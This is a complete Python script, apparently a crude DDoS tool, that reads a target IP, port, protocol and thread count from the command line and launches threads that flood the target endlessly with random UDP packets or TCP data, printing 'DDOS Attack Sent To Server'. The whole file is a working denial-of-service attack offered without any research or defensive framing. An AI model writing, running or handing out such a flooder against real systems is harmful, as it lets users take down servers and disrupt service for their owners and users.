import socket, threading, time, sys, random

ip = str(sys.argv[1])
port = int(sys.argv[2])
choice = str(sys.argv[3])
times = int(sys.argv[4])
threads = int(sys.argv[5])

def run():
    data = random._urandom(1024)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" DDOS Attack Sent To Server")
        except:
            print("[!] Error")

def run2():
    data = random._urandom(16)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" DDOS Attack Sent To Server")
        except:
            s.close()
            print("[*] Error")

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()

